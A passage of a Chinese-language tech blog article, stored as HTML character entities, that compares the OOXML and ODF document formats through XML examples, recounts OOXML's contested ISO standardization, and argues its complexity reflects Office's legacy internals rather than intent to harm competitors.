&#23601;&#26159;&#20250;&#22240;&#20026;&#21508;&#31181;&#24847;&#24819;&#19981;&#21040;&#30340;&#21407;&#22240;&#65292;&#32473;&#20320;&#21046;&#36896;&#31867;&#20284;&#30340;&#12300;&#24778;&#21916;&#12301;&#12290;</li> </ul><p>&#20316;&#20026;&#23545;&#27604;&#65292;&#30456;&#21516;&#20869;&#23481;&#33509;&#20351;&#29992; LibreOffice &#30340; OpenDocument &#26684;&#24335;&#65288;ODF&#65289;&#23384;&#20648;&#65292;&#20854;&#23545;&#24212;&#30340; XML &#25991;&#20214; (<code>content.xml</code>) &#21017;&#35201;&#22909;&#25026;&#24471;&#22810;&#65306;</p><pre><code><text:p><text:span>To be</text:span> , or not to be, that is the question. </text:p></code></pre><p>&#20320;&#21487;&#33021;&#19968;&#30524;&#23601;&#35273;&#24471;&#36825;&#26159;&#19968;&#31181;&#26356;&#31616;&#26126;&#30340;&#26684;&#24335;&#12290;&#20107;&#23454;&#19978;&#65292;&#22914;&#26524;&#21435;&#25481;&#26631;&#31614;&#21644;&#23646;&#24615;&#24320;&#22836;&#30340;&#21629;&#21517;&#31354;&#38388; <code>text:</code>&#65292;&#23427;&#20960;&#20046;&#23601;&#26159;&#19968;&#27573;&#21512;&#27861;&#30340; HTML&#12290;&#21807;&#19968;&#38656;&#35201;&#35299;&#37322;&#30340;&#26159;&#31895;&#20307;&#25991;&#26412;&#30340;&#22788;&#29702;&#26041;&#24335;&#65306;ODF &#27809;&#26377;&#29992;&#19968;&#20010;&#12300;&#31895;&#20307;&#12301;&#26631;&#31614;&#30452;&#25509;&#21253;&#35065; <em>To be</em>&#65292;&#32780;&#26159;&#21019;&#24314;&#20102;&#19968;&#20010;&#21517;&#20026; <code>T1</code> &#30340;&#33258;&#21160;&#26679;&#24335;&#65292;&#24182;&#23558;&#20854;&#24212;&#29992;&#21040;&#21253;&#35065;&#25991;&#26412;&#30340; <code><text:span></text:span></code> &#20803;&#32032;&#19978;&#12290;&#36825;&#31181;&#20570;&#27861;&#20063;&#20307;&#29616;&#20102; Web &#20013;&#21463;&#25512;&#23815;&#30340;&#12300;&#20869;&#23481;&#19982;&#26679;&#24335;&#20998;&#31163;&#12301;&#21407;&#21017;&#12290;</p><p>&#24635;&#30340;&#26469;&#35828;&#65292;&#21482;&#35201;&#20320;&#30053;&#25026; Web &#22522;&#30784;&#65292;&#23601;&#33021;&#22823;&#33268;&#30475;&#25026; ODF &#30340; XML&#12290;&#30456;&#27604;&#20043;&#19979;&#65292;OOXML &#20013;&#37027;&#20123;&#26214;&#28073;&#30340;&#26631;&#31614;&#21517;&#65292;&#22823;&#27010;&#37117;&#38656;&#35201;&#21338;&#22763;&#21518;&#23398;&#20301;&#25165;&#33021;&#29468;&#20986;&#26469;&#26159;&#20160;&#20040;&#24847;&#24605;&#12290;</p><p>&#20197;&#19978;&#20998;&#26512;&#30340;&#36824;&#21482;&#26159;&#26368;&#31616;&#21333;&#30340;&#25991;&#26412;&#26684;&#24335;&#12290;&#22914;&#26524;&#28041;&#21450;&#34920;&#26684;&#12289;&#21015;&#34920;&#31561;&#22797;&#26434;&#20803;&#32032;&#65288;&#30456;&#20449;&#36825;&#26159;&#27599;&#20010;&#37325;&#24230; Word &#29992;&#25143;&#20849;&#20139;&#30340;&#22121;&#26790;&#65289;&#65292;OOXML &#30340;&#22797;&#26434;&#31243;&#24230;&#21482;&#20250;&#35753;&#20320;&#26356;&#21152;&#25376;&#22836;&mdash;&mdash;&#20960;&#21315;&#39029;&#30340;&#25991;&#26723;&#19981;&#26159;&#21507;&#24178;&#39277;&#30340;&#12290;</p><p>&#38500;&#20102;&#24418;&#24335;&#19978;&#30340;&#22797;&#26434;&#65292;OOXML &#20316;&#20026;&#19968;&#20010;&#26631;&#20934;&#30340;&#36136;&#37327;&#20063;&#20196;&#20154;&#22570;&#24551;&#12290;&#22312; OOXML &#30340;&#21046;&#23450;&#38454;&#27573;&#65292;&#23601;&#26377;&#22823;&#37327;&#25991;&#31456;&#25351;&#20986;&#24494;&#36719;&#25552;&#20132;&#30340;&#35268;&#33539;&#25991;&#26723;&#23384;&#22312;<a href="https://noooxml.wdfiles.com/local--files/arguments/ODF-vs-OOXML-v1.2.pdf">&#35832;&#22810;&#25216;&#26415;&#32570;&#38519;</a>&#65292;&#20363;&#22914;&mdash;&mdash;</p><ul> <li>&#23558; Office &#20013;&#24050;&#30693;&#30340;&#38169;&#35823;&#25110;&#32773;&#22949;&#21327;&#32435;&#20837;&#26631;&#20934;&#65288;&#20363;&#22914;&#21516;&#26102;&#20445;&#30041; 1900 &#25110; 1904 &#24180;&#20026;&#36215;&#22987;&#28857;&#30340;&#20004;&#22871;&#26085;&#26399;&#31995;&#32479;&#65292;&#24182;&#19988;&#38169;&#35823;&#22320;<a href="https://learn.microsoft.com/en-us/troubleshoot/microsoft-365-apps/excel/wrongly-assumes-1900-is-leap-year">&#23558; 1900 &#24180;&#35270;&#20026;&#38384;&#24180;</a>&#65289;&#65307;</li> <li>&#19982;&#35821;&#35328;&#21306;&#22495;&#20195;&#30721;&#65288;ISO 639&#65289;&#12289;&#30690;&#37327;&#22270;&#24418;&#65288;W3C SVG&#65289;&#12289;&#25968;&#23398;&#31526;&#21495;&#65288;W3C MathML&#65289;&#31561;&#24050;&#30830;&#31435;&#30340;&#29616;&#23384;&#26631;&#20934;&#23384;&#22312;&#20914;&#31361;&#65307;</li> <li>&#20351;&#29992;&#23450;&#20041;&#19981;&#26126;&#30830;&#30340;&#35745;&#37327;&#21333;&#20301;&#65292;&#24182;&#19988;&#21069;&#21518;&#30683;&#30462;&#65307;&#20197;&#21450;</li> <li>&#23545;&#20803;&#32032;&#21644;&#23646;&#24615;&#30340;&#21629;&#21517;&#32422;&#23450;&#65288;&#20363;&#22914;&#22823;&#23567;&#20889;&#35268;&#21017;&#65289;&#26082;&#19981;&#28165;&#26224;&#20063;&#19981;&#19968;&#33268;&#12290;</li> </ul><p><a href="https://en.wikipedia.org/wiki/Standardization_of_Office_Open_XML">OOXML &#25104;&#20026; ISO &#26631;&#20934;&#30340;&#36807;&#31243;</a>&#20063;&#26497;&#23500;&#25103;&#21095;&#24615;&#12290;&#39318;&#20808;&#65292;&#24494;&#36719;&#36873;&#25321;&#36890;&#36807;&#12300;&#24555;&#36895;&#36890;&#36947;&#12301;&#25552;&#20132;&#26631;&#20934;&#12290;&#36825;&#26465;&#36890;&#36947;&#26412;&#26159;&#20026;&#37027;&#20123;&#25216;&#26415;&#25104;&#29087;&#12289;&#19994;&#30028;&#24191;&#27867;&#23454;&#26045;&#30340;&#31283;&#23450;&#35268;&#33539;&#25152;&#35774;&#12290;&#26174;&#28982;&#65292;OOXML &#22312; 2006 &#24180;&#34987;&#25552;&#20132;&#26102;&#23436;&#20840;&#19981;&#31526;&#21512;&#36825;&#20123;&#26465;&#20214;&#65306;&#23427;&#26159;&#19968;&#20010;&#20840;&#26032;&#30340;&#35268;&#33539;&#65292;&#21807;&#19968;&#30340;&#23436;&#25972;&#23454;&#29616;&#26159;&#23578;&#26410;&#27491;&#24335;&#21457;&#24067;&#30340; Office 2007&#65292;&#20854;&#20960;&#21315;&#39029;&#30340;&#35268;&#33539;&#25991;&#26723;&#26356;&#26159;&#26681;&#26412;&#19981;&#21487;&#33021;&#22312;&#30701;&#26102;&#38388;&#20869;&#23436;&#25104;&#23457;&#38405;&#12290;&#35895;&#27468;&#12289;&#33258;&#30001;&#36719;&#20214;&#22522;&#37329;&#20250;&#27431;&#27954;&#20998;&#37096;&#65288;FSFE&#65289;&#31561;&#32452;&#32455;&#21644;&#20247;&#22810;&#25216;&#26415;&#19987;&#23478;&#37117;&#23545;&#27492;&#25552;&#20986;&#20102;&#24322;&#35758;&#12290;</p><p>&#20854;&#21518;&#30340; ISO &#25237;&#31080;&#36807;&#31243;&#26356;&#26159;&#35813;&#32452;&#32455;&#21382;&#21490;&#19978;&#20105;&#35758;&#26368;&#22823;&#30340;&#19968;&#27425;&#12290;&#20363;&#22914;&#65292;&#22312;&#25237;&#31080;&#26399;&#38388;&#65292;&#32654;&#22269;&#12289;&#24847;&#22823;&#21033;&#31561;&#22269;&#30340;&#26631;&#20934;&#22996;&#21592;&#20250;&#25104;&#21592;&#25968;&#37327;&#28608;&#22686;&#65292;&#26032;&#25104;&#21592;&#22823;&#22810;&#26159;&#24494;&#36719;&#30340;&#21830;&#19994;&#20249;&#20276;&#65292;&#24182;&#19968;&#33268;&#25237;&#31080;&#25903;&#25345; OOXML&#12290;&#29790;&#20856;&#26631;&#20934;&#26426;&#26500;&#26368;&#21021;&#25237;&#20102;&#36190;&#25104;&#31080;&#65292;&#20294;&#38543;&#21518;&#22240;&#26333;&#20986;&#24494;&#36719;&#21521;&#21512;&#20316;&#20249;&#20276;&#25552;&#20379;&#25253;&#37228;&#20197;&#25442;&#21462;&#25903;&#25345;&#30340;&#19985;&#38395;&#65292;&#35813;&#25237;&#31080;&#34987;&#23459;&#24067;&#26080;&#25928;&#12290;</p><p>&#26368;&#32456;&#65292;ISO &#32463;&#21382;&#20102;&#33392;&#38590;&#30340;&#20004;&#36718;&#25237;&#31080;&#25165;&#35753; OOXML &#24471;&#20197;&#36890;&#36807;&#12290;&#20294;&#36825;&#19968;&#32467;&#26524;&#24182;&#26410;&#24179;&#24687;&#20105;&#35758;&#65292;&#24052;&#35199;&#12289;&#21360;&#24230;&#12289;&#21335;&#38750;&#12289;&#22996;&#20869;&#29790;&#25289;&#31561;&#22269;&#27491;&#24335;&#21521; ISO &#25552;&#20986;&#19978;&#35785;&#65292;&#35748;&#20026;&#25972;&#20010;&#36807;&#31243;&#23384;&#22312;&#31243;&#24207;&#29781;&#30133;&#12290;&#34429;&#28982;&#36825;&#20123;&#31243;&#24207;&#26368;&#32456;&#26410;&#33021;&#25512;&#32763;&#32467;&#26524;&#65292;&#20294;&#36275;&#20197;&#34920;&#26126;&#36825;&#27425;&#26631;&#20934;&#21270;&#36807;&#31243;&#30340;&#20998;&#35010;&#19982;&#28151;&#20081;&#12290;</p><h2>&#20026;&#20160;&#20040;&#35828;&#24494;&#36719;&#30340;&#21160;&#26426;&#24182;&#38750;&#33988;&#24847;&#30772;&#22351;&#31454;&#20105;</h2><p>&#21040;&#30446;&#21069;&#20026;&#27490;&#65292;&#35777;&#25454;&#20284;&#20046;&#37117;&#25903;&#25345; LibreOffice &#30340;&#35266;&#28857;&#65306;OOXML &#20316;&#20026;&#19968;&#20010;&#26631;&#20934;&#65292;&#26080;&#35770;&#22312;&#25216;&#26415;&#23618;&#38754;&#36824;&#26159;&#21046;&#23450;&#31243;&#24207;&#23618;&#38754;&#37117;&#26159;&#30456;&#24403;&#28518;&#33609;&#30340;&#12290;&#20294;&#20107;&#23454;&#24182;&#19981;&#33021;&#30452;&#25509;&#25512;&#20986;&#24847;&#22270;&#21644;&#21160;&#26426;&#12290;&#22914;&#26524;&#36827;&#19968;&#27493;&#20102;&#35299; OOXML &#30340;&#21046;&#23450;&#32972;&#26223;&#65292;&#23601;&#20250;&#21457;&#29616;&#30772;&#22351;&#31454;&#20105;&#33267;&#23569;&#24182;&#19981;&#26159;&#24494;&#36719;&#30340;&#39318;&#35201;&#30446;&#30340;&#12290;</p><p>&#39318;&#20808;&#24212;&#24403;&#30475;&#21040;&#65292;OOXML &#22312;&#26576;&#31181;&#31243;&#24230;&#19978;&#26159;&#24494;&#36719;&#22312;&#26085;&#30410;&#20005;&#26684;&#30340;&#21453;&#22404;&#26029;&#23457;&#26597;&#21644;&#24320;&#25918;&#26631;&#20934;&#31454;&#20105;&#21387;&#21147;&#19979;&#65292;&#37319;&#21462;&#30340;&#19968;&#31181;&#38450;&#24481;&#24615;&#23039;&#24577;&#12290;OOXML &#26684;&#24335;&#20110; 2005 &#24180;&#24213;<a href="https://news.microsoft.com/2005/11/21/qa-microsoft-co-sponsors-submission-of-office-open-xml-document-formats-to-ecma-international-for-standardization/">&#23459;&#24067;</a>&#12290;&#24403;&#26102;&#65292;&#24494;&#36719;&#27491;&#22312;&#19978;&#35785;&#27431;&#30431;&#22996;&#21592;&#20250;&#21069;&#19968;&#24180;&#23545;&#20854;&#20570;&#20986;&#30340;<a href="https://en.wikipedia.org/wiki/Microsoft_Corp._v_European_Commission#Judgment">&#21453;&#22404;&#26029;&#21028;&#20915;</a>&#12290;&#35813;&#26696;&#30340;&#19968;&#20010;&#26680;&#24515;&#38382;&#39064;&#23601;&#26159;&#24494;&#36719;&#25298;&#32477;&#21521; Sun &#20844;&#21496;&#25552;&#20379;&#24517;&#35201;&#30340;&#21327;&#35758;&#35268;&#33539;&#65292;&#38459;&#30861;&#20102;&#36328;&#31995;&#32479;&#20860;&#23481;&#12290;&#19981;&#38590;&#24819;&#35265;&#65292;Office &#30340;&#25991;&#20214;&#20860;&#23481;&#24615;&#25104;&#20026;&#19979;&#19968;&#20010;&#30417;&#31649;&#28966;&#28857;&#21482;&#26159;&#26102;&#38388;&#38382;&#39064;&#12290;&#65288;&#20107;&#23454;&#20063;&#30340;&#30830;&#22914;&#27492;&#65292;&#27431;&#30431;&#22312; 2008 &#24180;&#23545; Office &#31561;&#20135;&#21697;&#30340;&#20860;&#23481;&#24615;&#38382;&#39064;&#23637;&#24320;&#20102;<a href="https://competition-cases.ec.europa.eu/cases/AT.39294">&#35843;&#26597;</a>&#12290;&#65289;</p><p>&#19982;&#27492;&#21516;&#26102;&#65292;&#31454;&#20105;&#26631;&#20934; ODF &#36880;&#28176;&#25104;&#22411;&#65292;&#24182;&#20110; 2006 &#24180; 5 &#26376;&#34987;&#27491;&#24335;&#25209;&#20934;&#20026; ISO &#22269;&#38469;&#26631;&#20934;&#12290;&#20840;&#29699;&#22810;&#22269;&#12289;&#29305;&#21035;&#26159;&#27431;&#27954;&#22269;&#23478;&#25919;&#24220;&#65292;&#24320;&#22987;&#20542;&#21521;&#20110;&#22312;&#25919;&#24220;&#25991;&#20214;&#20013;&#24378;&#21046;&#37319;&#29992;&#24320;&#25918;&#26631;&#20934;&#12290;&#22914;&#26524;&#24494;&#36719;&#19981;&#37319;&#21462;&#34892;&#21160;&#65292;Office &#23601;&#21487;&#33021;&#22240;&#19981;&#31526;&#21512;&#37319;&#36141;&#35201;&#27714;&#32780;&#34987;&#25490;&#38500;&#22312;&#25919;&#24220;&#35746;&#21333;&#20043;&#22806;&#12290;</p><p>&#22522;&#20110;&#27492;&#65292;&#25105;&#20204;&#21487;&#20197;&#23545;&#24494;&#36719;&#30340;&#21160;&#26426;&#20570;&#20986;&#21512;&#29702;&#25512;&#27979;&#65306;&#23427;&#36843;&#20999;&#38656;&#35201;&#19968;&#20010;&#30001;&#33258;&#24049;&#20027;&#23548;&#12289;&#19988;&#24102;&#26377;&#12300;&#22269;&#38469;&#26631;&#20934;&#12301;&#20809;&#29615;&#30340;&#26684;&#24335;&#65292;&#20197;&#24212;&#23545;&#28508;&#22312;&#30340;&#30417;&#31649;&#23457;&#26597;&#65292;&#24182;&#23545;&#25239; ODF &#30340;&#25361;&#25112;&#12290;&#36825;&#20010;&#26032;&#26684;&#24335;&#30340;&#39318;&#35201;&#30446;&#26631;&#19981;&#26159;&#31616;&#27905;&#12289;&#36890;&#29992;&#25110;&#26131;&#20110;&#23454;&#29616;&#65292;&#32780;&#26159;&#12300;&#23433;&#25242;&#12301;&#30417;&#31649;&#26426;&#26500;&#65292;&#21516;&#26102;&#26368;&#22823;&#38480;&#24230;&#22320;&#20445;&#30041;&#33258;&#36523;&#30340;&#25216;&#26415;&#20248;&#21183;&#21644;&#21830;&#19994;&#21033;&#30410;&#12290;&#35201;&#23454;&#29616;&#36825;&#19968;&#28857;&#65292;&#26368;&#20415;&#25463;&#12289;&#25104;&#26412;&#26368;&#20302;&#30340;&#36335;&#24452;&#65292;&#23601;&#26159;&#23558;&#33258;&#24049;&#29616;&#26377;&#30340;&#22797;&#26434;&#29983;&#24577;&#30452;&#25509;&#25171;&#21253;&#25104;&#19968;&#20010;&#25152;&#35859;&#30340;&#12300;&#26631;&#20934;&#12301;&#12290;</p><p>&#20026;&#20102;&#35828;&#26126;&#36825;&#19968;&#28857;&#65292;&#20540;&#24471;&#25351;&#20986; OOXML &#21644; ODF &#36824;&#23384;&#22312;&#19968;&#20010;&#26356;&#21152;&#26412;&#36136;&#30340;&#19981;&#21516;&#12290;&#20026;&#27492;&#65292;&#20877;&#27425;&#35266;&#23519;&#21069;&#38754;&#32473;&#20986;&#30340; XML &#20195;&#30721;&#29255;&#27573;&#65292;&#24182;&#19988;&#27880;&#24847;&#20004;&#31181;&#26684;&#24335;&#20013;&#25991;&#26412;&#20869;&#23481;&#30340;&#20986;&#29616;&#20301;&#32622;&#12290;</p><pre><code><!-- OOXML --> <w:p><w:r><w:rpr><w:b></w:b><w:bcs></w:bcs></w:rpr><w:t>To be</w:t></w:r><w:r><w:t>, or not to be, that is the question</w:t></w:r><w:r><w:t>.</w:t></w:r></w:p><!-- ODF --> <text:p><text:span>To be</text:span>, or not to be, that is the question.</text:p></code></pre><p>&#21487;&#20197;&#30475;&#21040;&#65292;&#22312; ODF &#20013;&#65292;&#25991;&#26412;&#20869;&#23481;&#21487;&#20197;&#19982; XML &#26631;&#31614;&#31359;&#25554;&#20986;&#29616;&#65292;&#23601;&#20687;&#22312; HTML &#20013;&#19968;&#26679;&#12290;&#32780;&#22312; OOXML &#20013;&#65292;&#25991;&#26412;&#20869;&#23481;&#27704;&#36828;&#34987;&#21253;&#35065;&#22312;&#26368;&#24213;&#23618;&#30340; <code><w:t></w:t></code> &#20803;&#32032;&#37324;&#65292;&#32477;&#19981;&#20250;&#19982;&#20854;&#20182;&#32467;&#26500;&#21270;&#26631;&#31614;&#24179;&#32423;&#12290;</p><p>&#36825;&#31181;&#24046;&#24322;&#21453;&#26144;&#20986;&#20004;&#31181;&#26684;&#24335;&#20351;&#29992; XML &#30340;&#26041;&#24335;&#23436;&#20840;&#19981;&#21516;&mdash;&mdash;</p><ul> <li>ODF &#30340;&#35821;&#27861;&#26159;&#23558; XML &#20316;&#20026;&#19968;&#31181;&#26631;&#35760;&#35821;&#35328;&#65288;markup language&#65289;&#20351;&#29992;&#30340;&#12290;&#25442;&#21477;&#35805;&#35828;&#65292;&#25991;&#26412;&#20869;&#23481;&#26159;&#36825;&#31181;&#35821;&#27861;&#20013;&#30340;&#20027;&#35282;&#65292;&#23574;&#25324;&#21495;&#25324;&#36215;&#30340; XML &#26631;&#31614;&#29615;&#32469;&#22312;&#25991;&#26412;&#29255;&#27573;&#21608;&#22260;&#65292;&#26631;&#35760;&#20854;&#20869;&#37096;&#25991;&#26412;&#30340;&#22806;&#35266;&#12289;&#20301;&#32622;&#12289;&#23618;&#32423;&#31561;&#29305;&#24449;&#12290;&#36825;&#20854;&#23454;&#20063;&#26159; XML &#30340;<a href="https://en.wikipedia.org/wiki/XML#History">&#35774;&#35745;&#21021;&#34935;</a>&mdash;&mdash;&#20419;&#36827;&#25968;&#23383;&#23186;&#20307;&#20013;&#30340;&#20449;&#24687;&#23637;&#31034;&#65307;</li> <li>OOXML &#21017;&#23558; XML &#25386;&#29992;&#20026;&#20102;&#19968;&#31181;&#24207;&#21015;&#21270;&#65288;serialization&#65289;&#26684;&#24335;&#12290;&#25152;&#35859;&#12300;&#24207;&#21015;&#21270;&#12301;&#65292;&#26159;&#25351;&#23558;&#31243;&#24207;&#20869;&#23384;&#20013;&#30340;&#25968;&#25454;&#32467;&#26500;&#25110;&#23545;&#35937;&#36716;&#21270;&#20026;&#19968;&#20018;&#21487;&#23384;&#20648;&#25110;&#20256;&#36755;&#30340;&#25991;&#26412;&#12290;&#25442;&#21477;&#35805;&#35828;&#65292;OOXML &#19982;&#20854;&#35828;&#26159;&#22312;&#25551;&#36848;&#25991;&#26723;&#20869;&#23481;&#65292;&#19981;&#22914;&#35828;&#26159;&#22312;&#25551;&#36848; Office &#36719;&#20214;&#12300;&#30475;&#21040;&#12301;&#30340;&#25277;&#35937;&#32467;&#26500;&#12290;&#20363;&#22914;&#65292;&#19978;&#25991;&#20363;&#23376;&#23601;&#24207;&#21015;&#21270;&#20102;&#19968;&#20010;&#27573;&#33853;&#31867;&#22411;&#23545;&#35937;&#65292;&#23427;&#26159;&#30001;&#22810;&#20010;&#25991;&#26412;&#29255;&#27573;&#31867;&#22411;&#23545;&#35937;&#32452;&#25104;&#30340;&#26377;&#24207;&#38598;&#21512;&#12290;&#20854;&#20013;&#65292;&#26377;&#30340;&#25991;&#26412;&#29255;&#27573;&#23545;&#35937;&#20855;&#26377;&#26679;&#24335;&#23646;&#24615;&#65292;&#24182;&#19988;&#27599;&#20010;&#25991;&#26412;&#23545;&#35937;&#37117;&#26377;&#19968;&#20010;&#23383;&#31526;&#20018;&#23646;&#24615;&#29992;&#26469;&#35760;&#24405;&#25991;&#23383;&#20869;&#23481;&#12290;</li> </ul><p>&#36825;&#20010;&#32467;&#35770;&#21487;&#20197;&#36890;&#36807;&#27604;&#36739; OOXML &#26631;&#20934;&#21644; Office &#30340;&#32534;&#31243;&#35821;&#35328; Visual Basic for Applications (VBA) &#24471;&#21040;&#21360;&#35777;&#12290;&#20363;&#22914;&#65292;OOXML &#20013;&#27573;&#33853;&#23646;&#24615; <code><w:ppr></w:ppr></code> &#25152;&#20801;&#35768;&#30340;&#23376;&#20803;&#32032;&#65288;ECMA-376 Part 1, &sect; 17.3.2.28&#65289;&#65292;&#19982; VBA &#20013;<a href="https://learn.microsoft.com/en-us/office/vba/api/word.paragraph">&#27573;&#33853;&#23545;&#35937; (<code>Paragraph</code>)</a> &#30340;&#23646;&#24615;&#20960;&#20046;&#19968;&#19968;&#23545;&#24212;&#12290;&#20854;&#20182;&#35768;&#22810; OOXML &#20803;&#32032;&#21644;&#23545;&#24212;&#30340; VBA &#23545;&#35937;&#20063;&#26377;&#36825;&#31181;&#23545;&#24212;&#20851;&#31995;&#12290;</p><p>&#36825;&#23601;&#35299;&#37322;&#20102; OOXML &#22797;&#26434;&#24615;&#30340;&#25104;&#22240;&#65306;&#23427;&#21407;&#23553;&#19981;&#21160;&#22320;&#21453;&#26144;&#20102; Office &#36719;&#20214;&#30340;&#32321;&#22797;&#21151;&#33021;&#21644;&#21382;&#21490;&#21253;&#34993;&#12290;&#20026;&#20102;&#20445;&#35777;&#23384;&#20648;&#26684;&#24335;&#30340;&#36824;&#21407;&#24230;&#21644;&#20860;&#23481;&#24615;&#65292;&#24494;&#36719;&#27809;&#26377;&#36873;&#25321;&#22312;&#25991;&#20214;&#20013;&#25551;&#36848;&#25991;&#26723;&#30340;&#22806;&#35266;&#65292;&#28982;&#21518;&#29992;&#31243;&#24207;&#26469;&#35299;&#26512;&#21644;&#36824;&#21407;&#36825;&#20123;&#25551;&#36848;&#65292;&#32780;&#26356;&#20687;&#26159;&#30452;&#25509;&#25226;&#31243;&#24207;&#30340;&#36816;&#34892;&#29366;&#24577;&#36716;&#20648;&#21040;&#25991;&#20214;&#20013;&#12290;&#20174;&#36825;&#20010;&#24847;&#20041;&#19978;&#35828;&#65292;OOXML &#19982;&#20854;&#35828;&#26159;&#19968;&#20010;&#12300;&#26631;&#20934;&#12301;&#65292;&#19981;&#22914;&#35828;&#23601;&#26159;&#24212;&#29992;&#31243;&#24207;&#26412;&#36523;&#65292;&#26159; Office &#36719;&#20214;&#30340;&#23556;&#24433;&#12290;</p><p>&#20107;&#23454;&#19978;&#65292;&#30001;&#20110; Office &#30340;&#21382;&#21490;&#21253;&#34993;&#36807;&#20110;&#27785;&#37325;&#65292;&#24494;&#36719;&#33258;&#24049;&#21040;&#29616;&#22312;&#37117;&#27809;&#26377;&#20570;&#21040;&#23436;&#20840;&#36981;&#24490; OOXML &#26631;&#20934;&#12290;ECMA-376 &#23558; OOXML &#20998;&#20026;&#12300;&#20005;&#26684;&#12301;&#65288;Strict&#65289;&#21644;&#12300;&#36807;&#28193;&#12301;&#65288;Transitional&#65289;&#20004;&#20010;&#29256;&#26412;&#12290;&#25152;&#35859;&#12300;&#36807;&#28193;&#12301;&#65292;&#23601;&#26159;&#20026;&#20102;&#20860;&#23481;&#26087;&#29256; Office &#30340;&#21508;&#31181;&#29305;&#27530;&#34892;&#20026;&#32780;&#20445;&#30041;&#30340;&#21151;&#33021;&#65292;&#35760;&#24405;&#22312;&#26631;&#20934;&#30340;&#31532;&#22235;&#37096;&#20998;&#65292;&#20363;&#22914; <code>footnoteLayoutLikeWW8</code>&#12289;<code>autoSpaceLikeWord9</code>&#12289;<code>useWord97LineBreakRules</code> &#31561;&#31561;&#12290;&#26102;&#33267;&#20170;&#26085;&#65292;Office &#40664;&#35748;&#20445;&#23384;&#30340;&#20173;&#28982;&#26159;&#36825;&#31181;&#12300;&#36807;&#28193;&#12301;&#26684;&#24335;&#12290;&#24494;&#36719;&#36824;&#26377;&#19968;&#20221;&#20887;&#38271;&#30340;<a href="https://learn.microsoft.com/en-us/openspecs/office_standards/ms-oe376/21b45168-16f9-466d-9445-1992a02c517a">&#25991;&#26723;</a>&#35828;&#26126; Office &#22312;&#21738;&#20123;&#26041;&#38754;&#36829;&#21453;&#20102; ECMA-376 &#26631;&#20934;&#65292;&#20363;&#22914;&#23545;&#35768;&#22810;&#40664;&#35748;&#20540;&#30340;&#19981;&#21516;&#35808;&#37322;&#21644;&#22788;&#29702;&#12289;&#33258;&#23450;&#20041;&#37096;&#20214;&#21644;&#25193;&#23637;&#24615;&#31561;&#12290;</p><p>&#27492;&#22806;&#65292;&#23558;&#25991;&#20214;&#26684;&#24335;&#19982;&#31243;&#24207;&#29366;&#24577;&#39640;&#24230;&#32465;&#23450;&#65292;&#20063;&#19981;&#26159;&#19968;&#31181;&#25925;&#24847;&#12300;&#25605;&#27985;&#27700;&#12301;&#30340;&#26032;&#21457;&#26126;&#65292;&#32780;&#26159; Office &#30340;&#12300;&#31062;&#20256;&#12301;&#24605;&#36335;&#12290;&#30693;&#21517;&#36719;&#20214;&#24037;&#31243;&#21338;&#20027; Joel Spolsky &#22312;<a href="https://www.joelonsoftware.com/2008/02/19/why-are-the-microsoft-office-file-formats-so-complicated-and-some-workarounds/">&#19968;&#31687;&#32463;&#20856;&#25991;&#31456;</a>&#20013;&#20998;&#26512;&#36807;&#26087;&#29256; Office &#20108;&#36827;&#21046;&#26684;&#24335;&#30340;&#22797;&#26434;&#24615;&#65292;&#20854;&#20013;&#34920;&#26126;&#36825;&#20123;&#26087;&#26684;&#24335;&#36824;&#35201;&#26356;&#31867;&#20284;&#20110;&#20869;&#23384;&#30340;&#30452;&#25509;&#36716;&#20648;&#65292;&#24182;&#19988;&#20063;&#35748;&#20026;&#36825;&#31181;&#35774;&#35745;&#26356;&#22810;&#26159;&#20986;&#20110;&#24615;&#33021;&#21644;&#29616;&#23454;&#30340;&#32771;&#37327;&#65292;&#32780;&#38750;&#24694;&#24847;&#25110;&#26080;&#33021;&#12290;</p><p>&#20854;&#23454;&#65292;&#26089;&#22312; OOXML &#20043;&#21069;&#65292;&#24494;&#36719;&#23601;&#24050;&#32463;&#22312;&#25506;&#32034;&#20174;&#20108;&#36827;&#21046;&#26684;&#24335;&#21521; XML &#36716;&#22411;&#65292;&#24182;&#19988;&#22312; Office XP &#21644; 2003 &#20013;&#20998;&#21035;&#25903;&#25345;&#20102;&#19968;&#31181;&#26356;&#12300;&#21407;&#22987;&#12301;&#30340; <a href="https://learn.microsoft.com/en-us/previous-versions/office/developer/office-xp/aa140066(v=office.10)">Excel XML</a> &#21644; <a href="https://learn.microsoft.com/en-us/previous-versions/office/developer/office-2003/aa174023(v=office.11)">Word XML</a> &#26684;&#24335;&#12290;&#36825;&#20123;&#26684;&#24335;&#30340;&#35821;&#27861;&#24050;&#32463;&#20307;&#29616;&#20986; OOXML &#30340;&#38607;&#24418;&#65292;&#20294;&#27809;&#26377;&#37319;&#29992; ZIP &#25171;&#21253;&#65292;&#32780;&#26159;&#23558;&#25152;&#26377;&#32452;&#20214;&#21644;&#36164;&#28304;&#25991;&#20214;&#65288;&#32534;&#30721;&#20026;&#20108;&#36827;&#21046;&#25968;&#25454;&#65289;&#37117;&#22534;&#25918;&#22312;&#21333;&#20010; XML &#25991;&#20214;&#20013;&#12290;&#36825;&#20063;&#20174;&#20391;&#38754;&#34920;&#26126;&#65292;OOXML &#24182;&#19981;&#26159;&#24494;&#36719;&#20026;&#20102;&#12300;&#25630;&#20081;&#12301;&#31454;&#20105;&#32780;&#23450;&#21046;&#30340;&#65292;&#32780;&#26159;&#19968;&#20123;&#24050;&#26377;&#24605;&#36335;&#21644;&#25104;&#26524;&#30340;&#24310;&#32493;&mdash;&mdash;&#23613;&#31649;&#24182;&#19981;&#26159;&#29305;&#21035;&#20248;&#38597;&#30340;&#24605;&#36335;&#21644;&#25104;&#26524;&#12290;</p><h2>&#32467;&#35821;</h2><p>&#26412;&#25991;&#30340;&#30446;&#30340;&#24182;&#19981;&#26159;&#20026;&#24494;&#36719;&#24320;&#33073;&#65307;&#23427;&#26412;&#21487;&#20197;&#20570;&#24471;&#26356;&#22909;&#12290;&#24403;&#38754;&#20020;&#12300;&#24320;&#25918;&#12301;&#30340;&#22806;&#37096;&#35201;&#27714;&#26102;&#65292;&#24494;&#36719;&#26412;&#21487;&#20197;&#25512;&#20986;&#19968;&#20010;&#26356;&#24178;&#20928;&#21644;&#29616;&#20195;&#30340;&#26631;&#20934;&#65292;&#23558;&#24222;&#26434;&#12289;&#20805;&#28385;&#30683;&#30462;&#30340;&#12300;&#36951;&#20135;&#12301;&#20445;&#30041;&#22312;&#31243;&#24207;&#20869;&#37096;&#33258;&#34892;&#28040;&#21270;&#12290;&#30456;&#21453;&#65292;&#23427;&#36873;&#25321;&#23558;&#36825;&#20123;&#36951;&#20135;&#32479;&#32479;&#